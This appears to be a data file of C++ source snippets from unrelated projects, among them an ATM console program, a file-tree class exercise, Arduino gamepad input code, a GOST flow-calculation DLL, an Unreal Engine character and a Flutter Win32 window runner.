account.See your\";\r\n\t\t\t\t\tcout<<\"\\n\\t bank representation for assistance during bank opening hours\";\r\n\t\t\t\t\tcout<<\"\\n\\t Thanks for,your choice today!!\";\r\n\t\t\t\t\tcout<<\"\\n\\n\\t Press any key to continue.......\";\r\n\t\t\t\t\r\n\t\t\t\tcase 1:\r\n\t\t\t\t\tcout<<\"Enter Your Pin Access Number! [Only one attempt is allowed]\";\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t\t\r\n\t\t\t\t\tint pin;\r\n\t\t\t\t\tcout<<\"\\n\\n\\t Pin :\";\r\n\t\t\t\t\tcin>>pin;\r\n\t\t\t\t\tif(int pin=12345)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t\\t ATM MAIN MENU SCREEN\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [1] To Deposite Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [2] To Withdraw Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [3] To Balance Cash\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Enter [0] To Exit ATM\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t PLEASE ENTER A SELECTION AND PREE RETURN KEY:\";\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse \r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t\\t THANK YOU\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t You had made your attempt which failed !! No More attemps allowed!! Sorry!!\";\r\n\t\t\t\t\t\tcout<<\"\\n\\n\\t Press any key to continue.......\";\r\n\t\t\t\t\t\t\r\n\t\t\t\t\t}\r\n\t\t\t}\r\n\t\t\r\n}\r\nmain()\r\n{\r\n\tbank b;\r\n\tb.info();\r\n\tb.account();\r\n}",
    "#include <iostream>\n#include <string>\n#include <vector>\n\nusing namespace std;\n\nclass Item{\nprivate:\n    string name;\npublic:\n    Item(const string &n) : name(n) {}\n\n    // methods using upcasting (converting a derived class obj to a base class obj)\n    virtual const string &getName() const // the private data member can not be modified since it's a const reference\n    {\n        return name;\n    }\n    virtual const int &getSize() const\n    {\n        return 0;\n    }\n    /* VAR1:\n    virtual ostream& display(ostream& out) const // in this case, the classes file and directory must display the assigned name, then a file must include other details\n    {\n        return out<<name;\n    } */\n    /* VAR2\n    friend ostream &operator<<(ostream &out, const Item &obj)\n    {\n        out<<obj.getName(); // name is a private member, therefore i must use getName()\n        return out;\n    }*/\n    virtual void display(ostream& out) const = 0; // pure virtual function that is also defined in the derived classes\n    friend ostream &operator<<(ostream &out, const Item &obj) // overloading operator<< only in the base class\n    {\n        obj.display(out);\n        return out;\n    }\n};\n\nclass File : public Item{\nprivate:\n    int size;\n    string extension;\npublic:\n    File(const string &n, const string &ext, int s) : Item(n), extension(ext), size(s) {}\n    File(const string &n, const string &ext) : Item(n), extension(ext) {}\n    const int &getSize() const override\n    {\n        return size;\n    }\n    const string &getExtension() const\n    {\n        return extension;\n    }\n    /* VAR1:\n    ostream& display(ostream& out) const override\n    {\n        return Item::display(out)<<\".\"<<extension<<\" \"<<size; // using scope resolution operator since we must access the method display() defined in the base class item\n    }*/\n    /* VAR2\n    friend ostream &operator<<(ostream &out, const File &obj)\n    {\n        out<<static_cast<const Item &>(obj); // upcasting since we must convert a derived class pointer to the base class pointer (any file has a name, which is an item's attribute)\n        out<<\".\"<<obj.getExtension()<<\" \"<<obj.getSize();\n        return out;\n    }*/\n    void display(ostream& out) const override\n    {\n        out<<getName()<<\".\"<<extension<<\" \"<<size;\n    }\n};\n\nclass Directory : public Item{\nprivate:\n    vector<Item *> path;\npublic:\n    Directory(const string &n) : Item(n) { path.clear(); } // there's no need to declare the vector variable here\n    ~Directory()\n    {\n        if(!this->path.empty())\n        {\n            this->path.clear();\n        }\n    }\n    void addItem(Item *obj) // pointing at an item\n    {\n        path.push_back(obj); // adding objects to the current directory path\n    }\n    Directory *navigateTo(const string& name) // function which returns a pointer to a directory\n    {\n        // for every item located within the path, declared as references\n        // might have to implement exception handling block\n        for (const auto& item : path)\n        {\n            // if the name corresponds and it is a directory\n            if (item->getName() == name && dynamic_cast<Directory*>(item)) // we must use dynamic_cast since the item should be checked whether it is a directory or not\n            {\n                return dynamic_cast<Directory*>(item);\n            }\n        }\n        return nullptr;\n    }\n    void addDirectory(const string& name)\n    {\n        Directory *new_dir = new Directory(name);\n        addItem(new_dir); // addItem() is part of the directory class methods (don't be mistaken), otherwise i should've used the scope resolution operator\n    }\n    int getNumberOfItems() // the number of direct children nodes is the size on the path vector for the current directory\n    {\n        return path.size(); // size() instead of length() since we use elements in the vector path of type pointer\n    }\n    int getSize()\n    {\n        int total_size = 0;\n        for(const auto &item : path)\n        {\n            Directory *subdir = dynamic_cast<Directory*>(item);\n            if(subdir)\n            {\n                total_size += subdir->getSize(); // sizes of files located in each subdir\n            } else\n            {\n                total_size += item->getSize();\n            }\n        }\n        return total_size;\n    }\n    void syntaxHelper(std::ostream& out, int k) const\n    {\n        for (int i = 0; i < k; i++)\n        {\n            out<<\" \"; // increasing the indentation in relation to directory-subdirectory depth\n        }\n        if (k == 1)\n        {\n            out<<\"|-\"; // hyphen = the immediate nodes located within the parent folder\n        } else if (k != 0)\n        {\n            out<<\"|_\"; // underscore = every other level of items contained in the parent's folder direct children\n        }\n    }\n    /* VAR 1/2: friend ostream &operator<<(ostream &out, const Directory &obj) // operator<< overloading\n    {\n        // the indentation is specific to every level, meaning it should be consistent for items",
    "#include <Arduino.h>\n\n#include \"global_vars.h\"\n\n// right held down - SOCD-L: left + right = last command wins; up + down = last command wins\nvoid useSOCD2() {\n  if (!upRead) {\n    if (!upPreviousState) {\n      upPreviousMillis = currentMillis;\n      upPreviousState = 1;\n    }\n    if (!downRead) {\n      if (upPreviousMillis > downPreviousMillis) {\n        pinMode(upOUT, OUTPUT);\n        digitalWrite(upOUT, LOW);\n      } else {\n        pinMode(upOUT, INPUT);\n      }\n    } else {\n      pinMode(upOUT, OUTPUT);\n      digitalWrite(upOUT, LOW);\n    }\n  }\n\n  if (upRead) {\n    upPreviousState = 0;\n    pinMode(upOUT, INPUT);\n  }\n\n  if (!downRead) {\n    if (!downPreviousState) {\n      downPreviousMillis = currentMillis;\n      downPreviousState = 1;\n    }\n    if (!upRead) {\n      if (downPreviousMillis > upPreviousMillis) {\n        pinMode(downOUT, OUTPUT);\n        digitalWrite(downOUT, LOW);\n      } else {\n        pinMode(downOUT, INPUT);\n      }\n    } else {\n      pinMode(downOUT, OUTPUT);\n      digitalWrite(downOUT, LOW);\n    }\n  }\n\n  if (downRead) {\n    downPreviousState = 0;\n    pinMode(downOUT, INPUT);\n  }\n\n  if (!leftRead) {\n    if (!leftPreviousState) {\n      leftPreviousMillis = currentMillis;\n      leftPreviousState = 1;\n    }\n    if (!rightRead) {\n      if (leftPreviousMillis > rightPreviousMillis) {\n        pinMode(leftOUT, OUTPUT);\n        digitalWrite(leftOUT, LOW);\n      } else {\n        pinMode(leftOUT, INPUT);\n      }\n    } else {\n      pinMode(leftOUT, OUTPUT);\n      digitalWrite(leftOUT, LOW);\n    }\n  }\n\n  if (leftRead) {\n    leftPreviousState = 0;\n    pinMode(leftOUT, INPUT);\n  }\n\n  if (!rightRead) {\n    if (!rightPreviousState) {\n      rightPreviousMillis = currentMillis;\n      rightPreviousState = 1;\n    }\n    if (!leftRead) {\n      if (rightPreviousMillis > leftPreviousMillis) {\n        pinMode(rightOUT, OUTPUT);\n        digitalWrite(rightOUT, LOW);\n      } else {\n        pinMode(rightOUT, INPUT);\n      }\n    } else {\n      pinMode(rightOUT, OUTPUT);\n      digitalWrite(rightOUT, LOW);\n    }\n  }\n\n  if (rightRead) {\n    rightPreviousState = 0;\n    pinMode(rightOUT, INPUT);\n  }\n\n  if ((!leftRead) && (!rightRead) && (!upRead) && (!downRead)) {\n    SOCD_speech_text = \" WTF\";\n  } else if ((!leftRead) && (!rightRead) && (upRead) && (downRead) && (leftPreviousMillis > rightPreviousMillis)) {\n    SOCD_speech_text = \"L+R:L\";\n  } else if ((!leftRead) && (!rightRead) && (upRead) && (downRead) && (leftPreviousMillis < rightPreviousMillis)) {\n    SOCD_speech_text = \"L+R:R\";\n  } else if ((!upRead) && (!downRead) && (leftRead) && (rightRead) && (downPreviousMillis > upPreviousMillis)) {\n    SOCD_speech_text = \"U+D:D\";\n  } else if ((!upRead) && (!downRead) && (leftRead) && (rightRead) && (downPreviousMillis < upPreviousMillis)) {\n    SOCD_speech_text = \"U+D:U\";\n  } else if ((!leftRead) && (!rightRead) && (!upRead || !downRead) && leftPreviousMillis > rightPreviousMillis) {\n    SOCD_speech_text = \"L+R:L\";\n  } else if ((!leftRead) && (!rightRead) && (!upRead || !downRead) && leftPreviousMillis < rightPreviousMillis) {\n    SOCD_speech_text = \"L+R:R\";\n  } else if ((!upRead) && (!downRead) && (!leftRead || !rightRead) && downPreviousMillis > upPreviousMillis) {\n    SOCD_speech_text = \"U+D:D\";\n  } else if ((!upRead) && (!downRead) && (!leftRead || !rightRead) && downPreviousMillis > upPreviousMillis) {\n    SOCD_speech_text = \"U+D:U\";\n  } else {\n    SOCD_speech_text = \" \";\n  }\n}\n",
    "\ufeff// dllmain.cpp : \u041e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u0442 \u0442\u043e\u0447\u043a\u0443 \u0432\u0445\u043e\u0434\u0430 \u0434\u043b\u044f \u043f\u0440\u0438\u043b\u043e\u0436\u0435\u043d\u0438\u044f DLL.\n#include \"pch.h\"\n#include \"dllmain.h\"\n\n\n\nBOOL APIENTRY DllMain( HMODULE hModule,\n                       DWORD  ul_reason_for_call,\n                       LPVOID lpReserved\n                     )\n{\n    switch (ul_reason_for_call)\n    {\n    case DLL_PROCESS_ATTACH:\n        break;\n    case DLL_THREAD_ATTACH:\n        break;\n    case DLL_THREAD_DETACH:\n        break;\n    case DLL_PROCESS_DETACH:\n        break;\n    }\n    return TRUE;\n}\n\n\n\ndouble get_C(double Re, double B, double D) {\n    double A = pow((19000. * B / Re), 0.8);\n    double L1 = 0, L2 = 0; // \u0434\u043b\u044f \u0443\u0433\u043b\u043e\u0432\u043e\u0433\u043e \u0441\u043f\u043e\u0441\u043e\u0431\u0430 \u043e\u0442\u0431\u043e\u0440\u0430 \u0434\u0430\u0432\u043b\u0435\u043d\u0438\u0439\n    double M1 = 2 * L2 / (1 - B);\n    double M2 = 0;\n    if (D < 0.07112) {\n        M2 = 0.011 * (0.75 - B) * (2.8 - (D / 0.0254));\n    }\n    return 0.5961 + 0.0261 * pow(B, 2) - 0.216 * pow(B, 8) + 0.000521 * pow(((B * 1e6) / Re), 0.7) + (\n        0.0188 + 0.0063 * A) * pow(B, 3.5) * pow((1e6 / Re), 0.3) + (\n            0.043 + 0.08 * pow(e, (-10 * L1)) - 0.123 * pow(e, (-7 * L1))) * (1 - 0.11 * A) * (\n                pow(B, 4) / (1 - pow(B, 4))) - 0.031 * (M1 - 0.8 * pow(M1, 1.1)) * pow(B, 1.3) + M2;\n}\n\ndouble get_A(int i, double Re) {\n    double tab[3][3][4] = {\n        { // index 1\n            {8.87, -3.7114, 0.41841, 0},\n            {6.7307, -5.5844, 0.732485, 0},\n            {-10.244, 5.7094, 0.76477, 0}\n        },\n        { // index 2\n            {27.23, -11.458, 1.6117, -0.07567},\n            {-25.928, 12.426, -2.09397, 0.106143},\n            {1.7622, -3.8765, 1.05567, -0.076764}\n        },\n        { // index 3\n            {16.5416, -6.60709, 0.88147, -0.039226},\n            {322.594, -132.2, 17.795, -0.799765},\n            {-92.029, 37.935, -5.1885, 0.23583}\n        }\n    };\n\n    double sum = 0;\n    int tab_index = (Re <= 1e5) ? 0 : (Re <= 3e6) ? 1 : 2;\n\n    for (int k = 0; k < 4; ++k) {\n        sum += tab[tab_index][i][k] * pow(fabs(log10(Re)), k);\n    }\n\n    return sum;\n}\n\ndouble get_y(double Re, double Ra, double Ra_max, double Ra_min, double D, bool  mark) {\n    double Rsh = 0.0, kD = 0.0, kR = 5.035 / Re;\n\n    if (!mark) {\n        Rsh = pi * Ra;\n    }\n    else if (Ra > Ra_max) {\n        Rsh = pi * Ra_max;\n    }\n    else {\n        Rsh = pi * Ra_min;\n    }\n\n    kD = 0.26954 * Rsh / D;\n\n    return pow((1.74 - 2 * log10((2 * Rsh / D) - ((37.36 * log10(kD - kR * log10(kD + 3.3333 * kR))) / Re))), -2);\n}\n\ndouble get_Ksh(double Re, double Ra, double B, double D) {\n    double leftRa_max = 0, leftRa_min = 0, Ra_max = 0, Ra_min = 0;\n    // Ra_max   \n    if (Re <= 1e4) {\n        leftRa_max = 0.718866 * pow(B, (-3.887)) + 0.364;\n    }\n    else if (B < 0.65) {\n        leftRa_max = get_A(0, Re) * pow(B, get_A(1, Re)) + get_A(2, Re);\n    }\n    else {\n        leftRa_max = get_A(0, Re) * pow(0.65, get_A(1, Re)) + get_A(2, Re);\n    }\n\n    if (leftRa_max >= 15) {\n        Ra_max = 15e-4 * D;\n    }\n    else {\n        Ra_max = leftRa_max * 1e-4 * D;\n    }\n\n    // Ra_min\n    if (B < 0.65) {\n        leftRa_min = 7.1592 - 12.387 * B - (20.118 - 3.469 * B) * log10(Re) + (0.1382 - 0.23762 * B) * pow(log10(Re), 2);\n    }\n    else {\n        leftRa_min = -0.892352 + 0.24308 * log10(Re) - 0.0162562 * pow(log10(Re), 2);\n    }\n\n    if (leftRa_min <= 0 or Re < 3e6) {\n        Ra_min = 0;\n    }\n    else {\n        Ra_min = 1e-4 * D * leftRa_min;\n    }\n\n    if (Ra >= Ra_min and Ra <= Ra_max) {\n        return 1;\n    }\n    else {\n        double y0 = get_y(Re, Ra, Ra_max, Ra_min, D), y1 = get_y(Re, Ra, Ra_max, Ra_min, D, true);\n\n        return 1 + 5.22 * pow(B, 3.5) * (y0 - y1);\n    }\n\n\n}\n\ndouble get_qm(double Re_cur, double d, double Ksu, double E, double B, double D, double Ra, double Kp, double eps, double dP, double T, double P) {\n    double C = get_C(Re_cur, B, D); // (\u0413\u041e\u0421\u0422 8.586.2 \u043f.5.3.2.1)\n    double Ksh = get_Ksh(Re_cur, Ra, B, D); // (\u0413\u041e\u0421\u0422 8.586.2 \u043f.5.3.2.2)\n    return 0.25 * pi * pow(d, 2) * C * E * Ksh * Kp * eps * pow((2 * dP * Pls * ((P * Ts) / (Ps * T))), 0.5);\n}\n\ndouble get_true_qm(double u, double d_20, double Ksu, double E, double B, double D, double Ra, double Kp, double eps, double dP, double T, double P) {\n    double Re_first = 1e6;\n    double qm_first = get_qm(Re_first, d_20, Ksu, E, B, D, Ra, Kp, eps, dP, T, P); // (\u0413\u041e\u0421\u0422 8.568.5 \u043f.5.2.3)\n    double Re_cur = get_Re(qm_first, D, u); // (\u0413\u041e\u0421\u0422 8.568.5 \u043f.5.2.5)\n    double qm_cur = get_qm(Re_cur = Re_cur, d_20, Ksu, E, B, D, Ra, Kp, eps, dP, T, P);\n    while (100 * fabs(qm_cur - qm_first) / qm_first >= 0.001) {\n        qm_first = qm_cur;\n        Re_cur = get_Re(qm_first, D, u);\n        qm_cur = get_qm(Re_cur = Re_cur, d_20, Ksu, E, B, D, Ra, Kp, eps, dP, T, P);\n    }\n\n    return round(3600 * qm_cur); // \u043f\u0435\u0440\u0435\u0432\u043e\u0434 \u0432 \u043a\u0433/\u0447 \n}\n\ndouble get_Re(double qm, double D, double u) {\n    return (4 * qm) / (pi * D * u);\n};\n\n__declspec(dllexport) double __cdecl calc_airflow_mu(double p_izm, double dp_izm, double t_izm, double d_20, double D_20) {\n    // \u0418\u0441\u0445\u043e\u0434\u043d\u044b\u0435 \u0434\u0430\u043d\u043d\u044b\u0435\n\n    double Ra = 0.045e-3; // \u0421\u0440\u0435\u0434\u043d\u0435\u0435 \u0430\u0440\u0438\u0444\u043c\u0435\u0442\u0438\u0447\u0435\u0441\u043a\u043e\u0435 \u043e\u0442\u043a\u043b\u043e\u043d\u0435\u043d\u0438\u0435 \u043f\u0440\u043e\u0444\u0438\u043b\u044f \u0448\u0435",
    "#include <iostream>\n#include <string>\n#include <unordered_map>\n#include <vector>\n\nusing namespace std;\n\nclass Student {\nprivate:\n    string name;\n    string hobby;\n\npublic:\n    Student(const string& name, const string& hobby) : name(name), hobby(hobby) {}\n\n    string getName() const {\n        return name;\n    }\n\n    string getHobby() const {\n        return hobby;\n    }\n};\n\n\nvoid selectGroup(Student* students, int size) {\n    unordered_map<string, vector<string>> groups;\n    for (int i = 0; i < size; ++i) {\n        string hobby = students[i].getHobby();\n        groups[hobby].push_back(students[i].getName());\n    }\n\n    for (const auto& pair : groups) {\n        cout << \"Group with hobby '\" << pair.first << \"':\" << endl;\n        for (const auto& student : pair.second) {\n            cout << student << endl;\n        }\n        cout << endl;\n    }\n}\n\nint main() {\n   Student students[] = {\n        Student(\"Ivan\", \"music\"),\n        Student(\"Max\", \"gym\"),\n        Student(\"Alex\", \"gym\"),\n        Student(\"Masha\", \"music\"),\n        Student(\"Pasha\", \"art\"),\n        Student(\"Vova\", \"gym\"),\n    };\n\n    selectGroup(students, sizeof(students) / sizeof(students[0]));\n \n    return 0;\n}\n",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"SooterCharacter.h\"\n#include \"GameFramework/SpringArmComponent.h\"\n#include \"Camera/CameraComponent.h\"\n#include \"GameFramework/CharacterMovementComponent.h\"\n#include \"Kismet/GameplayStatics.h\"\n#include \"Sound/SoundCue.h\"\n#include \"Engine/SkeletalMeshSocket.h\"\n#include \"Particles/ParticleSystem.h\"\n#include \"Particles/ParticleSystemComponent.h\"\n#include \"Animation/AnimMontage.h\"\n#include \"DrawDebugHelpers.h\"\n#include \"Item.h\"\n#include \"Components/WidgetComponent.h\"\n#include \"Weapon.h\"\n#include \"Components/SphereComponent.h\"\n#include \"Components/BoxComponent.h\"\n\n\n// Sets default values\nASooterCharacter::ASooterCharacter() :\n\tBaseTurnRate(45.f),\n\tBaseLookUpRate(45.f),\n\t//Turn Rates for aiming / not aiming \n\tHipTurnRate(90.f),\n\tHipLookUpRate(90.f),\n\tAimingTurnRate(20.f),\n\tAimingLookUpRate(20.f),\n\t// Mouse Look Sensitivity scale factors\n\tMouseHipTurnRate(1.0f),\n\tMouseHipLookUpRate(1.0f),\n\tMouseAimingTurnRate(0.2f),\n\tMouseAimingLookUpRate(0.2f),\n\t//true when aiming\n\tbAiming(false),\n\t// Camera field of view values\n\tCameraDefaultFOV(0.f), // Set in BeginPlay\n\tCameraZoomedFOV(25.f),\n\tCameraCurrentFov(0.f),\n\tZoomInterpSpeed(20.f),\n\t// Crosshair spread factor\n\tCrosshairSpreadMultiplier(0.f),\n\tCrosshairVelocityFactor(0.f),\n\tCrosshairInAirFactor(0.f),\n\tCrosshairAimFactor(0.f),\n\tCrosshairShootingFactor(0.f),\n\t// Bullet fire timer variables\n\tShootTimeDuration(0.05f),\n\tbFiringBullet(false),\n\t//Automatic fire variables\n\tbFireButtonPressed(false),\n\tbShouldFire(true),\n\tAutomaticFireRate(0.1f),\n\t// item trace variables\n\tbShouldTraceForItems(false),\n\tOverlappedItemCount(0),\n\t// Camera Inter location variables\n\tCameraInterpDistance(250.f),\n\tCameraInterpElevation(65.f)\n\t\n\t\n\n\n\t\n{\n\t// Set this character to call Tick() every frame.  You can turn this off to improve performance if you don't need it.\n\tPrimaryActorTick.bCanEverTick = true;\n\n\t//create a camera boom (pulls in towards character if there is a collision)\n\tCameraBoom = CreateDefaultSubobject<USpringArmComponent>(TEXT(\"CameraBoom\"));\n\tCameraBoom->SetupAttachment(RootComponent);\n\tCameraBoom->TargetArmLength = 300.f; // the camera follows at this distance behind the character \n\tCameraBoom->bUsePawnControlRotation = true; // rotate the arm based on the controller \n\tCameraBoom->SocketOffset = FVector(0.f, 50.f, 50.f);\n\n\t//Create a Follow Camera\n\tFollowCamera = CreateDefaultSubobject<UCameraComponent>(TEXT(\"FollowCamera\"));\n\tFollowCamera->SetupAttachment(CameraBoom, USpringArmComponent::SocketName); // Attached Follow Camera to end of CameraBoom\n\tFollowCamera->bUsePawnControlRotation = false; //Camera does not rotate relative to arm\n\n\t// Dont rotate when the controller rotates. Let The controller only affect the camera.\n\tbUseControllerRotationPitch = false;\n\tbUseControllerRotationYaw = true;\n\tbUseControllerRotationRoll = false;\n\n\t//configure character movement \n\tGetCharacterMovement()->bOrientRotationToMovement = false; // character moves in tehe direction of input\n\tGetCharacterMovement()->RotationRate = FRotator(0.f, 540.f, 0.f);// ... at this rotation rate\n\tGetCharacterMovement()->JumpZVelocity = 600.f;\n\tGetCharacterMovement()->AirControl = 5.0f;\n}\n\n// Called when the game starts or when spawned\nvoid ASooterCharacter::BeginPlay()\n{\n\tSuper::BeginPlay();\n\n\tif (FollowCamera)\n\t{\n\t\tCameraDefaultFOV = GetFollowCamera()->FieldOfView;\n\t\tCameraCurrentFov = CameraCurrentFov;\n\t}\n\n\n\t// Spawn the default weapon and equip it\n\tEquipWeapon(SpawnDefaultWeapon());\n\t\n\t\n}\n\nvoid ASooterCharacter::MoveFoward(float Value)\n{\n\tif (( Controller != nullptr) && ( Value != 0))\n\t{\n\t\tconst FRotator Rotation{ Controller->GetControlRotation() };\n\t\tconst FRotator YawRotation{ 0, Rotation.Yaw,0 };\n\n\t\tconst FVector Direction{ FRotationMatrix{YawRotation}.GetUnitAxis(EAxis::X)};\n\t\t\n\t\tAddMovementInput(Direction, Value);\n\t\t\n\t}\n}\n\nvoid ASooterCharacter::MoveRight(float Value)\n{\n\tif ((Controller != nullptr) && (Value != 0))\n\t{\n\t\tconst FRotator Rotation{ Controller->GetControlRotation() };\n\t\tconst FRotator YawRotation{ 0, Rotation.Yaw,0 };\n\n\t\tconst FVector Direction{ FRotationMatrix{YawRotation}.GetUnitAxis(EAxis::Y) };\n\n\t\tAddMovementInput(Direction, Value);\n\n\t}\n}\n\nvoid ASooterCharacter::TurnAtRate(float Rate)\n{\n\tAddControllerYawInput(Rate * BaseTurnRate * GetWorld()->GetDeltaSeconds());\n}\n\nvoid ASooterCharacter::LookUpAtRate(float Rate)\n{\n\tAddControllerPitchInput(Rate * BaseLookUpRate * GetWorld()->GetDeltaSeconds());\n}\n\nvoid ASooterCharacter::Turn(float Value)\n{\t\n\tfloat TurnScaleFactor{};\n\tif (bAiming)\n\t{\n\t\tTurnScaleFactor = MouseAimingTurnRate;\n\t}\n\telse\n\t{\n\t\tTurnScaleFactor = MouseHipTurnRate;\n\t}\n\n\tAddControllerYawInput(Value * TurnScaleFactor);\n}\n\nvoid ASooterCharacter::LookUp(float Value)\n{\n\tfloat LookUpScaleFactor{};\n\tif (bAiming)\n\t{\n\t\tLookUpScaleFactor = MouseAimingLookUpRate;\n\t}\n\telse\n\t{\n\t\tLookUpScaleFactor = MouseHipLookUpRate;\n\t}\n\n\tAddControllerPitchInput(Value * LookUpScaleFactor);\n}\n\nvoid ASooterCharacter::FireWeapon()\n{\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    